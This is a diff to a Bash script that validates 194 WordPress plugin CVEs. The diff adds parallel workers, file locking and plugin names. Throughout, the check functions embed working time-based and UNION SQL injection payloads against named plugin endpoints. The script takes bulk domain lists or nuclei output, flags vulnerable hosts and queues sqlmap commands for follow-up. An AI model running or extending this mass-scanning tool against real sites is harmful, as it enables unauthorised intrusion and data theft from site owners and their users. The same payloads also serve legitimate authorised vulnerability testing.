@@ -2,7 +2,7 @@
 # ============================================================
 # WordPress Universal Vulnerability Validator
 # 194 CVEs: SQLi, Auth Bypass, PrivEsc
-# Usage: ./validate_wp_sqli.sh [-o DIR] [--csv] <url|domains.txt|nuclei_out.txt>
+# Usage: ./validate_wp_sqli.sh [-o DIR] [--csv] [-j N|--jobs N] <url|domains.txt|nuclei_out.txt>
 # ============================================================
 set -uo pipefail
 IFS=$'\n\t'
@@ -18,11 +18,13 @@ TIMEOUT=12
 CSV_MODE=0
 OUTDIR="/tmp/wp_validate_$(date +%Y%m%d_%H%M%S)"
 
+JOBS=1
 POSITIONAL=()
 while [[ $# -gt 0 ]]; do
     case "$1" in
         -o) OUTDIR="$2"; shift 2 ;;
         --csv) CSV_MODE=1; shift ;;
+        --jobs|-j) JOBS="$2"; shift 2 ;;
         *) POSITIONAL+=("$1"); shift ;;
     esac
 done
@@ -42,15 +44,14 @@ log_vuln() {
     local DOMAIN="$1" CVE="$2" STATUS="$3" PAYLOAD="$4"
     local TYPE="${5:-exploit}"
     echo -e "${RED}  [VULN] ${DOMAIN} | ${CVE} | ${STATUS} | ${PAYLOAD}${NC}"
-    echo "${DOMAIN} | ${CVE} | ${STATUS} | ${PAYLOAD}" >> "$RESULTS_FILE"
-    echo "$DOMAIN" >> "$VULN_FILE"
+    flock -x "$RESULTS_FILE" -c "echo '${DOMAIN} | ${CVE} | ${STATUS} | ${PAYLOAD}' >> '$RESULTS_FILE'; echo '$DOMAIN' >> '$VULN_FILE'"
     if [ "$CSV_MODE" -eq 1 ]; then
         local SP; SP=$(echo "$PAYLOAD" | sed 's/"/""/g')
-        printf '"%s","%s","%s","%s","%s"\n' "$DOMAIN" "$CVE" "$TYPE" "$SP" "$STATUS" >> "$CSV_FILE"
+        flock -x "$CSV_FILE" -c "printf '\"%s\",\"%s\",\"%s\",\"%s\",\"%s\"\\n' '$DOMAIN' '$CVE' '$TYPE' '$SP' '$STATUS' >> '$CSV_FILE'"
     fi
 }
 log_safe() { echo -e "${GREEN}  [SAFE] ${1} | ${2} | ${3}${NC}"; }
-add_sqlmap() { echo "$1" >> "$SQLMAP_FILE"; }
+add_sqlmap() { flock -x "$SQLMAP_FILE" -c "echo '$1' >> '$SQLMAP_FILE'"; }
 
 time_check() {
     local URL="$1" METHOD="${2:-GET}" DATA="${3:-}" SL="${4:-$SLEEP_SEC}"
@@ -206,7 +207,7 @@ _check_CVE_2022_0948() { check_time_post "$1" "$2" 'CVE-2022-0948' 'order-listen
 _check_CVE_2022_0949() { check_time_post "$1" "$2" 'CVE-2022-0949' 'block-and-stop-bad-bots' '/wp-admin/admin-ajax.php' 'action=stopbadbots_grava_fingerprint&fingerprint=0'; }
 _check_CVE_2022_1013() { check_time_post "$1" "$2" 'CVE-2022-1013' 'personal-dictionary' '/wp-admin/admin-ajax.php' 'action=ays_pd_ajax&function=ays_pd_game_find_word&groupsIds[]=1)+AND+(SELECT+3066+FROM+(SELECT(SLEEP(7)))CEHy)--+-'; }
 _check_CVE_2022_1057() { check_time_get "$1" "$2" 'CVE-2022-1057' 'pricing-deals-for-woocommerce' '/wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+-'; }
-_check_CVE_2022_1453() { check_time_get "$1" "$2" 'CVE-2022-1453' '' '/wp-json/rsvpmaker/v1/sked/1?post_id=(SELECT%209999%20FROM%20(SELECT(SLEEP(7)))a)'; }
+_check_CVE_2022_1453() { check_time_get "$1" "$2" 'CVE-2022-1453' 'rsvpmaker' '/wp-json/rsvpmaker/v1/sked/1?post_id=(SELECT%209999%20FROM%20(SELECT(SLEEP(7)))a)'; }
 _check_CVE_2022_1768() { check_time_post "$1" "$2" 'CVE-2022-1768' 'rsvpmaker' '/wp-json/rsvpmaker/v1/stripesuccess/anythinghere' 'rsvp_id=(select(0)from(select(sleep(7)))a)&amount=1234&email=randomtext'; }
 _check_CVE_2022_1950() { check_time_post "$1" "$2" 'CVE-2022-1950' 'youzify' '/wp-admin/admin-ajax.php' 'action=youzify_media_pagination&data[type]=photos&page=1&data[group_id]=(SELECT 7958 FROM (SELECT(SLEEP(6)))XVfJ)'; }
 _check_CVE_2022_21661() { check_plugin_only "$1" "$2" 'CVE-2022-21661' 'wordpress'; }
@@ -243,42 +244,42 @@ _check_CVE_2023_28662() { check_time_get "$1" "$2" 'CVE-2023-28662' 'gift-vouche
 _check_CVE_2023_28787() { check_time_get "$1" "$2" 'CVE-2023-28787' '' '/'; }
 _check_CVE_2023_3076() { check_plugin_only "$1" "$2" 'CVE-2023-3076' 'mstore-api'; }
 _check_CVE_2023_3077() { check_time_get "$1" "$2" 'CVE-2023-3077' 'mstore-api' '/wp-json/api/flutter_booking/get_staffs?product_id=%27+or+ID=sleep(6)--+-'; }
-_check_CVE_2023_3197() { check_time_get "$1" "$2" 'CVE-2023-3197' '' '/wp-json/api/flutter_multi_vendor/product-categories'; }
+_check_CVE_2023_3197() { check_time_get "$1" "$2" 'CVE-2023-3197' 'flutter-woocommerce-app' '/wp-json/api/flutter_multi_vendor/product-categories'; }
 _check_CVE_2023_32243() { check_plugin_only "$1" "$2" 'CVE-2023-32243' 'essential-addons-for-elementor-lite'; }
-_check_CVE_2023_32590() { check_time_post "$1" "$2" 'CVE-2023-32590' '' '/wp-json/textmagic/v1/smsreceived' '{"sender": "1'\'' AND (SELECT 1 FROM (SELECT(SLEEP(10)))sqltest) AND '\''1'\''='\''1","text": "test"}'; }
+_check_CVE_2023_32590() { check_time_post "$1" "$2" 'CVE-2023-32590' 'subscribe-to-category' '/wp-json/textmagic/v1/smsreceived' '{"sender": "1'\'' AND (SELECT 1 FROM (SELECT(SLEEP(10)))sqltest) AND '\''1'\''='\''1","text": "test"}'; }
 _check_CVE_2023_3460() { check_plugin_only "$1" "$2" 'CVE-2023-3460' 'ultimate-member'; }
 _check_CVE_2023_4490() { check_time_post "$1" "$2" 'CVE-2023-4490' 'wp-job-portal' '/wp-job-portal-jobseeker-controlpanel/jobs' 'jobtitle=aaaa&salarytype=&salaryfixed=&salarymin=&salarymax=&salaryduration=2&duration=&city=(select*from(select(sleep(7)))a)&metakeywords=&save=Search+Job&default_longitude=71.2577233&default_latitud'; }
-_check_CVE_2023_50839() { check_time_post "$1" "$2" 'CVE-2023-50839' '' '/js-support-ticket-controlpanel/' 'form_request=jssupportticket&jstmod=ticket&task=showticketstatus&email=test@test.com'\'' AND SLEEP(8)-- -&ticketid=test123'; }
+_check_CVE_2023_50839() { check_time_post "$1" "$2" 'CVE-2023-50839' 'js-support-ticket' '/js-support-ticket-controlpanel/' 'form_request=jssupportticket&jstmod=ticket&task=showticketstatus&email=test@test.com'\'' AND SLEEP(8)-- -&ticketid=test123'; }
 _check_CVE_2023_5203() { check_plugin_only "$1" "$2" 'CVE-2023-5203' ''; }
-_check_CVE_2023_5204() { check_time_post "$1" "$2" 'CVE-2023-5204' '' '/wp-admin/admin-ajax.php' 'action=wpbo_search_response&name=test&keyword=test&strid=1 AND (SELECT 42 FROM (SELECT(SLEEP(8)))sqltest)'; }
-_check_CVE_2023_5652() { check_time_post "$1" "$2" 'CVE-2023-5652' '' '/wp-admin/admin-ajax.php' 'action=x&taxonomy=hb_room_type&hb_room_type_ordering[1]=0 END, name=(SELECT SLEEP(8)), term_id=CASE when 1=1 THEN 1'; }
+_check_CVE_2023_5204() { check_time_post "$1" "$2" 'CVE-2023-5204' 'chatbot' '/wp-admin/admin-ajax.php' 'action=wpbo_search_response&name=test&keyword=test&strid=1 AND (SELECT 42 FROM (SELECT(SLEEP(8)))sqltest)'; }
+_check_CVE_2023_5652() { check_time_post "$1" "$2" 'CVE-2023-5652' 'wp-hotel-booking' '/wp-admin/admin-ajax.php' 'action=x&taxonomy=hb_room_type&hb_room_type_ordering[1]=0 END, name=(SELECT SLEEP(8)), term_id=CASE when 1=1 THEN 1'; }
 _check_CVE_2023_6009() { check_plugin_only "$1" "$2" 'CVE-2023-6009' 'userpro'; }
-_check_CVE_2023_6030() { check_time_get "$1" "$2" 'CVE-2023-6030' '' '/wp-content/plugins/logdash-activity-log/README.txt'; }
+_check_CVE_2023_6030() { check_time_get "$1" "$2" 'CVE-2023-6030' 'logdash-activity-log' '/wp-content/plugins/logdash-activity-log/README.txt'; }
 _check_CVE_2023_6063() { check_time_get "$1" "$2" 'CVE-2023-6063' 'wp-fastest-cache' '/wp-login.php'; }
 _check_CVE_2023_6360() { check_time_get "$1" "$2" 'CVE-2023-6360' 'my-calendar' '/wp-content/plugins/my-calendar/readme.txt'; }
 _check_CVE_2023_6567() { check_time_get "$1" "$2" 'CVE-2023-6567' 'learnpress' '/wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1'; }
 _check_CVE_2023_7337() { check_plugin_only "$1" "$2" 'CVE-2023-7337' ''; }
-_check_CVE_2024_0705() { check_time_get "$1" "$2" 'CVE-2024-0705' '' '/'; }
+_check_CVE_2024_0705() { check_time_get "$1" "$2" 'CVE-2024-0705' 'payment-gateway-stripe-and-woocommerce-integration' '/'; }
 _check_CVE_2024_10400() { check_md5_get "$1" "$2" 'CVE-2024-10400' 'tutor' '/wp-admin/admin-ajax.php'; }
 _check_CVE_2024_1061() { check_time_get "$1" "$2" 'CVE-2024-1061' 'html5-video-player' '/?rest_route=/h5vp/v1/view/1&id=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
 _check_CVE_2024_1071() { check_time_get "$1" "$2" 'CVE-2024-1071' 'ultimate-member' '/?p=1'; }
 _check_CVE_2024_10924() { check_plugin_only "$1" "$2" 'CVE-2024-10924' 'really-simple-ssl'; }
 _check_CVE_2024_11728() { check_time_get "$1" "$2" 'CVE-2024-11728' 'kivicare-clinic-management-system' '/'; }
-_check_CVE_2024_12025() { check_time_get "$1" "$2" 'CVE-2024-12025' '' '/wp-json/collapsing-categories/v1/get?showPosts=1&taxonomy=category%27%29+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-'; }
-_check_CVE_2024_13322() { check_time_post "$1" "$2" 'CVE-2024-13322' '' '/wp-admin/admin-ajax.php' 'action=bsa_stats_chart_callback&ad_id=1+and+(select*from(select(sleep(0.7)))a)-- -'; }
+_check_CVE_2024_12025() { check_time_get "$1" "$2" 'CVE-2024-12025' 'collapsing-categories' '/wp-json/collapsing-categories/v1/get?showPosts=1&taxonomy=category%27%29+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-'; }
+_check_CVE_2024_13322() { check_time_post "$1" "$2" 'CVE-2024-13322' 'ap-plugin-scripteo' '/wp-admin/admin-ajax.php' 'action=bsa_stats_chart_callback&ad_id=1+and+(select*from(select(sleep(0.7)))a)-- -'; }
 _check_CVE_2024_13496() { check_time_get "$1" "$2" 'CVE-2024-13496' 'gamipress' '/'; }
 _check_CVE_2024_13726() { check_time_get "$1" "$2" 'CVE-2024-13726' 'tc-ecommerce' '/'; }
 _check_CVE_2024_1512() { check_time_get "$1" "$2" 'CVE-2024-1512' 'masterstudy-lms-learning-management-system' '/?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071'; }
 _check_CVE_2024_1698() { check_time_post "$1" "$2" 'CVE-2024-1698' 'notificationx' '/wp-json/notificationx/v1/analytics' '{"nx_id": "1","type": "clicks\`=1 and 1=sleep(5)-- -"}'; }
 _check_CVE_2024_1751() { check_time_get "$1" "$2" 'CVE-2024-1751' 'tutor' '/courses/'; }
-_check_CVE_2024_27956() { check_time_post "$1" "$2" 'CVE-2024-27956' '' '/wp-content/plugins/wp-automatic/inc/csv.php' 'q=SELECT IF(1=1,sleep(5),sleep(0));&auth=%00&integ=dc9b923a00f0e449c3b401fb0d7e2fae'; }
+_check_CVE_2024_27956() { check_time_post "$1" "$2" 'CVE-2024-27956' 'wp-automatic' '/wp-content/plugins/wp-automatic/inc/csv.php' 'q=SELECT IF(1=1,sleep(5),sleep(0));&auth=%00&integ=dc9b923a00f0e449c3b401fb0d7e2fae'; }
 _check_CVE_2024_28000() { check_plugin_only "$1" "$2" 'CVE-2024-28000' 'litespeed-cache'; }
 _check_CVE_2024_2876() { check_time_post "$1" "$2" 'CVE-2024-2876' 'email-subscribers' '/wp-admin/admin-post.php' 'page=es_subscribers&is_ajax=1&action=_sent&advanced_filter[conditions][0][0][field]=status=99924)))union(select(sleep(4)))--+&advanced_filter[conditions][0][0][operator]==&advanced_filter[conditions]['; }
 _check_CVE_2024_2879() { check_time_get "$1" "$2" 'CVE-2024-2879' 'LayerSlider' '/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))x)--+x)'; }
 _check_CVE_2024_30490() { check_time_post "$1" "$2" 'CVE-2024-30490' 'profilegrid-user-profiles-groups-and-communities' '/wp-admin/admin-ajax.php' 'action=pm_get_all_groups&search=test'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))a)--+-&sortby=newest&pagenum=1&view=grid'; }
-_check_CVE_2024_30498() { check_time_post "$1" "$2" 'CVE-2024-30498' '' '/wp-admin/admin-ajax.php' 'action=post_cfx_form&form_id=1%27OR(EXP(~(SELECT*FROM(SELECT(SLEEP(8)))a)))OR%27&vx_is_ajax=1&fixed[test]=a'; }
-_check_CVE_2024_30502() { check_time_get "$1" "$2" 'CVE-2024-30502' '' '/trip/'; }
-_check_CVE_2024_32128() { check_time_get "$1" "$2" 'CVE-2024-32128' '' '/?wpl_format=f:property_listing:ajax&wpl_function=get_total_results&sf_tmin_price=1'; }
+_check_CVE_2024_30498() { check_time_post "$1" "$2" 'CVE-2024-30498' 'crm-perks-forms' '/wp-admin/admin-ajax.php' 'action=post_cfx_form&form_id=1%27OR(EXP(~(SELECT*FROM(SELECT(SLEEP(8)))a)))OR%27&vx_is_ajax=1&fixed[test]=a'; }
+_check_CVE_2024_30502() { check_time_get "$1" "$2" 'CVE-2024-30502' 'wp-travel-engine' '/trip/'; }
+_check_CVE_2024_32128() { check_time_get "$1" "$2" 'CVE-2024-32128' 'real-estate-listing-realtyna-wpl' '/?wpl_format=f:property_listing:ajax&wpl_function=get_total_results&sf_tmin_price=1'; }
 _check_CVE_2024_32709() { check_md5_get "$1" "$2" 'CVE-2024-32709' 'wp-recall' '/account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5({{num}}),0x7c,%20%22Version:%22,version()),13--+-'; }
 _check_CVE_2024_3495() { check_md5_get "$1" "$2" 'CVE-2024-3495' 'country-state-city-auto-dropdown' '/'; }
 _check_CVE_2024_3552() { check_time_get "$1" "$2" 'CVE-2024-3552' 'web-directory-free' '/'; }
@@ -310,15 +311,15 @@ _check_CVE_2024_8911() { check_time_post "$1" "$2" 'CVE-2024-8911' 'latepoint' '
 _check_CVE_2024_9186() { check_time_get "$1" "$2" 'CVE-2024-9186' 'wp-marketing-automations' '/'; }
 _check_CVE_2024_9796() { check_plugin_only "$1" "$2" 'CVE-2024-9796' 'wp-advanced-search'; }
 _check_CVE_2024_9863() { check_plugin_only "$1" "$2" 'CVE-2024-9863' 'userpro'; }
-_check_CVE_2025_13138() { check_time_post "$1" "$2" 'CVE-2025-13138' '' '/wp-admin/admin-ajax.php' 'action=wdk_public_action&page=wdk_frontendajax&function=select_2_ajax&table=category_m&columns_search=category_title)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-&q[term]=test'; }
+_check_CVE_2025_13138() { check_time_post "$1" "$2" 'CVE-2025-13138' 'wpdirectorykit' '/wp-admin/admin-ajax.php' 'action=wdk_public_action&page=wdk_frontendajax&function=select_2_ajax&table=category_m&columns_search=category_title)%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-&q[term]=test'; }
 _check_CVE_2025_1323() { check_plugin_only "$1" "$2" 'CVE-2025-1323' 'wp-recall'; }
 _check_CVE_2025_2010() { check_time_get "$1" "$2" 'CVE-2025-2010' 'jobwp' '/jobs/{{jobid}}/'; }
 _check_CVE_2025_2011() { check_plugin_only "$1" "$2" 'CVE-2025-2011' 'depicter'; }
-_check_CVE_2025_22785() { check_time_post "$1" "$2" 'CVE-2025-22785' '' '/wp-admin/admin-ajax.php' 'action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 1 FROM (SELECT(SLEEP(8)))sqltest)'; }
+_check_CVE_2025_22785() { check_time_post "$1" "$2" 'CVE-2025-22785' 'course-booking-system' '/wp-admin/admin-ajax.php' 'action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 1 FROM (SELECT(SLEEP(8)))sqltest)'; }
 _check_CVE_2025_4396() { check_time_get "$1" "$2" 'CVE-2025-4396' 'relevanssi' '/?s={{randstr}}&cats=1*sleep(5)'; }
-_check_CVE_2025_48281() { check_time_get "$1" "$2" 'CVE-2025-48281' '' '/designs/?orderby=(SELECT+42+FROM+(SELECT(SLEEP(7)))test)'; }
+_check_CVE_2025_48281() { check_time_get "$1" "$2" 'CVE-2025-48281' 'printcart' '/designs/?orderby=(SELECT+42+FROM+(SELECT(SLEEP(7)))test)'; }
 _check_CVE_2025_5287() { check_time_post "$1" "$2" 'CVE-2025-5287' 'posts-like-dislike' '/wp-admin/admin-ajax.php' 'action=my_likes_dislikes_action&post=1 AND (SELECT 1234 FROM (SELECT(SLEEP(6)))a)&state=like'; }
-_check_CVE_2025_54726() { check_time_get "$1" "$2" 'CVE-2025-54726' '' '/wp-json/jalw/v1/archive?cats=if(now()=sysdate(),SLEEP(6),0)&exclusionType=exclude'; }
+_check_CVE_2025_54726() { check_time_get "$1" "$2" 'CVE-2025-54726' 'jquery-archive-list-widget' '/wp-json/jalw/v1/archive?cats=if(now()=sysdate(),SLEEP(6),0)&exclusionType=exclude'; }
 _check_CVE_2025_6970() { check_time_post "$1" "$2" 'CVE-2025-6970' 'events-manager' '/wp-admin/admin-ajax.php' 'action=search_events&orderby=1*(select(sleep(8)))'; }
 _check_CVE_2025_8489() { check_plugin_only "$1" "$2" 'CVE-2025-8489' 'king-addons'; }
 _check_CVE_2026_1492() { check_plugin_only "$1" "$2" 'CVE-2026-1492' 'user-registration'; }
@@ -887,11 +888,12 @@ validate_domain() {
 }
 
 if [ "${#POSITIONAL[@]}" -eq 0 ]; then
-    echo "Usage: $0 [-o DIR] [--csv] <url|domains.txt|nuclei_output.txt>"
+    echo "Usage: $0 [-o DIR] [--csv] [-j N|--jobs N] <url|domains.txt|nuclei_output.txt>"
     echo ""
     echo "Options:"
     echo "  -o DIR    Output directory"
     echo "  --csv     Write results.csv"
+    echo "  -j N      Parallel jobs (default: 1, suggest: 20)"
     echo ""
     echo "Checks: 194 CVEs | 180 SQLi | 7 AuthBypass | 7 PrivEsc"
     exit 1
@@ -900,42 +902,85 @@ fi
 echo -e "${BOLD}${CYAN}====================================${NC}"
 echo -e "${BOLD}  WP Validator — 194 CVEs${NC}"
 echo -e "${BOLD}  Output: ${OUTDIR}${NC}"
+echo -e "${BOLD}  Jobs: ${JOBS}${NC}"
 [ "$CSV_MODE" -eq 1 ] && echo -e "${BOLD}  CSV → ${CSV_FILE}${NC}"
 echo -e "${CYAN}====================================${NC}"
 
+# Process a list of DOMAIN|CVE pairs (one per line) with up to $JOBS parallel workers
+process_pairs() {
+    local PAIRS_FILE="$1"
+    local TOTAL; TOTAL=$(wc -l < "$PAIRS_FILE" | tr -d ' ')
+    local DONE=0 ACTIVE=0
+    touch "$RESULTS_FILE" "$SQLMAP_FILE" "$VULN_FILE"
+    while IFS='|' read -r D C; do
+        [ -z "$D" ] || [ -z "$C" ] && continue
+        validate_domain "$D" "$C" &
+        ACTIVE=$((ACTIVE+1))
+        DONE=$((DONE+1))
+        printf "\r${CYAN}  [%d/%d] jobs=%d${NC}  " "$DONE" "$TOTAL" "$ACTIVE" >&2
+        if [ "$ACTIVE" -ge "$JOBS" ]; then
+            wait -n 2>/dev/null || wait
+            ACTIVE=$((ACTIVE > 0 ? ACTIVE-1 : 0))
+        fi
+    done < "$PAIRS_FILE"
+    wait
+    echo >&2
+}
+
+PAIRS_TMP=$(mktemp)
+TOTAL_PAIRS=0
 INPUT="${POSITIONAL[0]}"
 if [ -f "$INPUT" ]; then
     if grep -qP '^\[' "$INPUT"; then
-        echo -e "${YELLOW}Nuclei output — routing by template ID${NC}"
-        SEEN=""
+        echo -e "${YELLOW}Nuclei output — dedup + routing by template ID${NC}"
+        # Pre-deduplicate all pairs
         while IFS= read -r line; do
             TMPL_ID=$(echo "$line"|grep -oP '^\[([^\]]+)\]'|tr -d '[]')
             URL=$(echo "$line"|grep -oP 'https?://[^\s]+')
             DOMAIN=$(echo "$URL"|grep -oP 'https?://[^/\s]+')
-            [ -z "$TMPL_ID" ]||[ -z "$DOMAIN" ] && continue
-            PAIR="${DOMAIN}|${TMPL_ID}"
-            echo "$SEEN"|grep -qF "$PAIR" && continue
-            SEEN="${SEEN}${PAIR}"$'\n'
-            validate_domain "$DOMAIN" "$TMPL_ID"
-        done < "$INPUT"
+            [ -z "$TMPL_ID" ] || [ -z "$DOMAIN" ] && continue
+            echo "${DOMAIN}|${TMPL_ID}"
+        done < "$INPUT" | sort -u > "$PAIRS_TMP"
+        TOTAL_PAIRS=$(wc -l < "$PAIRS_TMP" | tr -d ' ')
+        echo -e "${YELLOW}  ${TOTAL_PAIRS} unique domain+CVE pairs (jobs=${JOBS})${NC}"
+        process_pairs "$PAIRS_TMP"
     else
         echo -e "${YELLOW}Domain list — ALL checks${NC}"
         while IFS= read -r line; do
             line=$(echo "$line"|tr -d '[:space:]')
-            [ -z "$line" ]||[[ "$line" =~ ^# ]] && continue
-            [[ "$line" =~ ^https?:// ]]||line="https://${line}"
-            validate_domain "$line"
-        done < "$INPUT"
+            [ -z "$line" ] || [[ "$line" =~ ^# ]] && continue
+            [[ "$line" =~ ^https?:// ]] || line="https://${line}"
+            echo "${line}|ALL"
+        done < "$INPUT" | sort -u > "$PAIRS_TMP"
+        # For domain list mode, validate_domain with "ALL" means no CVE hint → run all
+        while IFS='|' read -r D _; do
+            validate_domain "$D" &
+            ACTIVE=$((ACTIVE+1))
+            if [ "${ACTIVE:-0}" -ge "$JOBS" ]; then wait -n 2>/dev/null || wait; ACTIVE=0; fi
+        done < "$PAIRS_TMP"
+        wait
     fi
 else
     TARGET="$INPUT"
-    [[ "$TARGET" =~ ^https?:// ]]||TARGET="https://${TARGET}"
+    [[ "$TARGET" =~ ^https?:// ]] || TARGET="https://${TARGET}"
     validate_domain "$TARGET"
 fi
+
+rm -f "$PAIRS_TMP"
 
 echo -e "\n${BOLD}${CYAN}====================================${NC}"
 echo -e "${BOLD}  Done. Results: ${OUTDIR}${NC}"
 echo -e "${CYAN}====================================${NC}"
-[ -f "$RESULTS_FILE" ]&&[ -s "$RESULTS_FILE" ]&&{ echo -e "\n${RED}${BOLD}VULNERABLE:${NC}"; cat "$RESULTS_FILE"|while IFS= read -r l; do echo -e "  ${RED}${l}${NC}"; done; }
-[ -f "$SQLMAP_FILE" ]&&[ -s "$SQLMAP_FILE" ]&&echo -e "${YELLOW}SQLmap cmds → ${SQLMAP_FILE}${NC}"
+
+VULN_COUNT=0
+[ -f "$RESULTS_FILE" ] && VULN_COUNT=$(wc -l < "$RESULTS_FILE" | tr -d ' ')
+
+echo -e "${BOLD}  Confirmed vulns: ${RED}${VULN_COUNT}${NC}${BOLD} / ${TOTAL_PAIRS}${NC}"
+
+[ "$VULN_COUNT" -gt 0 ] && {
+    echo -e "\n${RED}${BOLD}VULNERABLE:${NC}"
+    sort -u "$RESULTS_FILE" | while IFS= read -r l; do echo -e "  ${RED}${l}${NC}"; done
+}
+[ -f "$SQLMAP_FILE" ] && [ -s "$SQLMAP_FILE" ] && echo -e "${YELLOW}SQLmap cmds → ${SQLMAP_FILE}${NC}"
+[ "$CSV_MODE" -eq 1 ] && [ -f "$CSV_FILE" ] && echo -e "${YELLOW}CSV → ${CSV_FILE}${NC}"
 [ "$CSV_MODE" -eq 1 ]&&[ -f "$CSV_FILE" ]&&echo -e "${YELLOW}CSV → ${CSV_FILE}${NC}"
